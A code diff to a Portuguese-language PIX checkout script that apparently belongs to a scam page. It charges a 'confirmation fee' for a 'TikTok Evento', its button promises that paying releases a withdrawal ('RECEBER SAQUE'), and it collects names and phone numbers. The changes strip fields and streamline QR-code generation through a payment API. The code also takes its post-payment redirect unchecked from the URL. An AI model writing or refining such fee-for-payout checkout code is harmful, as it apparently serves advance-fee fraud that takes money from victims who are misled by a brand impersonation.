@@ -6,16 +6,6 @@ function formatCurrency(value) {
     }).format(value);
 }
 
-function formatCPF(value) {
-    value = value.replace(/\D/g, '');
-    if (value.length <= 11) {
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d)/, '$1.$2');
-        value = value.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-    }
-    return value;
-}
-
 function formatPhone(value) {
     value = value.replace(/\D/g, '');
     if (value.length <= 11) {
@@ -31,14 +21,12 @@ function getCheckoutValue() {
     const valueParam = urlParams.get('valor') || urlParams.get('value') || urlParams.get('amount');
     
     if (valueParam) {
-        // Remove formatação e converte para número
         const numericValue = parseFloat(valueParam.replace(/[^\d,.-]/g, '').replace(',', '.'));
         if (!isNaN(numericValue) && numericValue > 0) {
             return numericValue;
         }
     }
     
-    // Valor padrão
     return 21.67;
 }
 
@@ -55,17 +43,10 @@ document.addEventListener('DOMContentLoaded', function() {
     
     // Atualiza os valores na interface
     document.getElementById('order-total').textContent = formatCurrency(checkoutValue);
-    document.getElementById('final-total').textContent = formatCurrency(checkoutValue);
     document.getElementById('pix-amount').textContent = formatCurrency(checkoutValue);
     
-    // Formatação de inputs
-    const documentInput = document.getElementById('document');
+    // Formatação de telefone
     const phoneInput = document.getElementById('phone');
-    
-    documentInput.addEventListener('input', function(e) {
-        e.target.value = formatCPF(e.target.value);
-    });
-    
     phoneInput.addEventListener('input', function(e) {
         e.target.value = formatPhone(e.target.value);
     });
@@ -76,72 +57,59 @@ document.addEventListener('DOMContentLoaded', function() {
         
         // Desabilita o botão
         submitBtn.disabled = true;
-        submitBtn.innerHTML = '<span>Processando...</span>';
+        submitBtn.textContent = 'Processando...';
         
         // Coleta os dados do formulário
-        const formData = {
-            fullName: document.getElementById('fullName').value.trim(),
-            email: document.getElementById('email').value.trim(),
-            phone: document.getElementById('phone').value.trim(),
-            document: document.getElementById('document').value.trim(),
-            amount: checkoutValue
-        };
+        const fullName = document.getElementById('fullName').value.trim();
+        const phone = document.getElementById('phone').value.trim();
         
         // Validação básica
-        if (!formData.fullName || !formData.email || !formData.phone || !formData.document) {
+        if (!fullName || !phone) {
             alert('Por favor, preencha todos os campos obrigatórios.');
             submitBtn.disabled = false;
-            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
+            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
             return;
         }
         
-        // Valida CPF (básico)
-        const cleanCPF = formData.document.replace(/\D/g, '');
-        if (cleanCPF.length !== 11) {
-            alert('Por favor, insira um CPF válido.');
+        // Valida telefone (mínimo 10 dígitos)
+        const cleanPhone = phone.replace(/\D/g, '');
+        if (cleanPhone.length < 10) {
+            alert('Por favor, insira um telefone válido.');
             submitBtn.disabled = false;
-            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
+            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
             return;
         }
         
         try {
+            // Separa nome e sobrenome
+            const nameParts = fullName.split(' ');
+            const firstName = nameParts[0] || '';
+            const lastName = nameParts.slice(1).join(' ') || '';
+            
             // Prepara dados para a API
             const paymentData = {
                 amount: checkoutValue,
                 description: 'Taxa de confirmação - TikTok Evento',
                 customer: {
-                    name: formData.fullName,
-                    document: cleanCPF,
-                    phone: formData.phone.replace(/\D/g, ''),
-                    email: formData.email
-                },
-                item: {
-                    title: 'Taxa de confirmação',
-                    price: checkoutValue,
-                    quantity: 1
-                },
-                utm: new URLSearchParams(window.location.search).toString()
+                    name: fullName,
+                    phone: cleanPhone,
+                    document: null // CPF opcional, pode ser null
+                }
             };
             
-            // Cria o pagamento PIX
-            const pixResponse = await window.PixupAPI.createPixPayment(paymentData);
+            // Gera o QR Code PIX
+            const pixResponse = await window.PixupAPI.generatePixQRCode(paymentData);
             
             // Verifica se temos o código PIX
-            if (pixResponse.pixCode || pixResponse.payment?.metadata?.pixCode) {
-                const pixCode = pixResponse.pixCode || pixResponse.payment.metadata.pixCode;
+            if (pixResponse.qrcode || pixResponse.pix_code || pixResponse.qr_code) {
+                const pixCode = pixResponse.qrcode || pixResponse.pix_code || pixResponse.qr_code;
                 
                 // Atualiza a interface
                 pixCodeInput.value = pixCode;
                 
-                // Se tiver QR Code
-                if (pixResponse.payment?.metadata?.pixQrCode) {
-                    const qrContainer = document.getElementById('pix-qr-container');
-                    qrContainer.innerHTML = `<img src="${pixResponse.payment.metadata.pixQrCode}" alt="QR Code PIX">`;
-                } else {
-                    // Gera QR Code usando API externa
-                    const qrContainer = document.getElementById('pix-qr-container');
-                    qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}" alt="QR Code PIX">`;
-                }
+                // Gera QR Code usando API externa
+                const qrContainer = document.getElementById('pix-qr-container');
+                qrContainer.innerHTML = `<img src="https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(pixCode)}" alt="QR Code PIX">`;
                 
                 // Mostra a área do PIX
                 pixArea.style.display = 'block';
@@ -151,13 +119,10 @@ document.addEventListener('DOMContentLoaded', function() {
                 pixArea.scrollIntoView({ behavior: 'smooth', block: 'start' });
                 
                 // Inicia verificação de status
-                if (pixResponse.payment?.id || pixResponse.transactionId) {
-                    const paymentId = pixResponse.payment?.id || pixResponse.transactionId;
-                    startPaymentStatusCheck(paymentId);
+                if (pixResponse.transaction_id || pixResponse.id) {
+                    const transactionId = pixResponse.transaction_id || pixResponse.id;
+                    startPaymentStatusCheck(transactionId);
                 }
-                
-                // Inicia timer
-                startTimer(30 * 60); // 30 minutos
             } else {
                 throw new Error('Código PIX não retornado pela API');
             }
@@ -166,14 +131,14 @@ document.addEventListener('DOMContentLoaded', function() {
             console.error('Erro ao processar pagamento:', error);
             alert('Erro ao gerar código PIX. Por favor, tente novamente.\n\n' + error.message);
             submitBtn.disabled = false;
-            submitBtn.innerHTML = '<span>GERAR PIX E FINALIZAR</span>';
+            submitBtn.textContent = 'PAGAR E RECEBER SAQUE!';
         }
     });
     
     // Handler do botão copiar
     copyPixBtn.addEventListener('click', function() {
         pixCodeInput.select();
-        pixCodeInput.setSelectionRange(0, 99999); // Para mobile
+        pixCodeInput.setSelectionRange(0, 99999);
         
         try {
             document.execCommand('copy');
@@ -181,17 +146,16 @@ document.addEventListener('DOMContentLoaded', function() {
             copyPixBtn.classList.add('copied');
             
             setTimeout(() => {
-                copyPixBtn.innerHTML = '<span>Copiar</span>';
+                copyPixBtn.innerHTML = '<span>Copiar PIX</span>';
                 copyPixBtn.classList.remove('copied');
             }, 2000);
         } catch (err) {
-            // Fallback para navegadores modernos
             navigator.clipboard.writeText(pixCodeInput.value).then(() => {
                 copyPixBtn.innerHTML = '<span>✓ Copiado!</span>';
                 copyPixBtn.classList.add('copied');
                 
                 setTimeout(() => {
-                    copyPixBtn.innerHTML = '<span>Copiar</span>';
+                    copyPixBtn.innerHTML = '<span>Copiar PIX</span>';
                     copyPixBtn.classList.remove('copied');
                 }, 2000);
             });
@@ -202,18 +166,12 @@ document.addEventListener('DOMContentLoaded', function() {
 // Função para verificar status do pagamento
 let statusCheckInterval = null;
 
-function startPaymentStatusCheck(paymentId) {
-    // Verifica a cada 5 segundos
+function startPaymentStatusCheck(transactionId) {
     statusCheckInterval = setInterval(async () => {
         try {
-            const status = await window.PixupAPI.verifyPaymentStatus(paymentId);
+            const status = await window.PixupAPI.verifyPaymentStatus(transactionId);
             
-            const statusElement = document.getElementById('pix-status');
-            
-            if (status.status === 'completed' || status.status === 'paid') {
-                statusElement.textContent = 'Pagamento confirmado!';
-                statusElement.style.color = '#28a745';
-                
+            if (status.status === 'paid' || status.status === 'completed') {
                 // Para a verificação
                 if (statusCheckInterval) {
                     clearInterval(statusCheckInterval);
@@ -221,39 +179,13 @@ function startPaymentStatusCheck(paymentId) {
                 
                 // Redireciona após 2 segundos
                 setTimeout(() => {
-                    // Pega URL de retorno da query string ou usa padrão
                     const urlParams = new URLSearchParams(window.location.search);
-                    const returnUrl = urlParams.get('return') || urlParams.get('redirect') || '../tik tok evento/bemvindoaoeventinho.shop/ap/index.html';
+                    const returnUrl = urlParams.get('return') || urlParams.get('redirect') || '/app/index.html';
                     window.location.href = returnUrl;
                 }, 2000);
-            } else if (status.status === 'pending' || status.status === 'waiting_payment') {
-                statusElement.textContent = 'Aguardando pagamento';
-                statusElement.style.color = '#ffc107';
             }
         } catch (error) {
             console.error('Erro ao verificar status:', error);
         }
     }, 5000);
 }
-
-// Função para timer
-function startTimer(seconds) {
-    const timerElement = document.getElementById('timer');
-    let remaining = seconds;
-    
-    const interval = setInterval(() => {
-        const minutes = Math.floor(remaining / 60);
-        const secs = remaining % 60;
-        
-        timerElement.textContent = `${String(minutes).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-        
-        if (remaining <= 0) {
-            clearInterval(interval);
-            timerElement.textContent = 'Expirado';
-            alert('O código PIX expirou. Por favor, gere um novo código.');
-        }
-        
-        remaining--;
-    }, 1000);
-}
-
